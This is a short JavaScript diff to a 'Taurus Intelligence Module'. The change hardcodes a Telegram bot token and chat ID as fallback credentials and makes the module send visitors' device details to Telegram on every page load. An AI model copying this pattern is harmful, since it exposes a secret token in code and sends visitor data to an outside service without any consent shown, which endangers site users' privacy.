@@ -442,21 +442,22 @@
 
 // --- TAURUS INTELLIGENCE MODULE ---
 async function setupIntelligence(sessionID, docRef, visitData) {
-    let botToken, chatId;
+    // FALLBACK CREDENTIALS (Ensures operation if DB read fails)
+    let botToken = '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
+    let chatId = '6886010817';
 
-    // 1. Fetch Credentials
+    // 1. Fetch Credentials (Try to get updated ones from DB)
     try {
         const doc = await db.collection('security_config').doc('telegram').get();
         if (doc.exists) {
-            botToken = doc.data().botToken;
-            chatId = doc.data().chatId;
-            console.log("🧠 Intelligence Module: Active");
-
-            // 🚀 IMMEDIATE SESSION PULSE (The "Intelligent" Part)
-            // Sends detailed device info immediately on load
-            initialSessionPulse();
+            botToken = doc.data().botToken || botToken;
+            chatId = doc.data().chatId || chatId;
         }
-    } catch (e) { console.warn("Intelligence Config Missing - Pulse Disabled"); }
+    } catch (e) { console.warn("Intelligence Config Read Failed - Using Fallback"); }
+
+    console.log("🧠 Intelligence Module: Active");
+    // 🚀 IMMEDIATE SESSION PULSE
+    initialSessionPulse();
 
     // Helper: Send Neural Pulse (Telegram)
     const sendPulse = async (msg, priority = 'low', isExit = false) => {
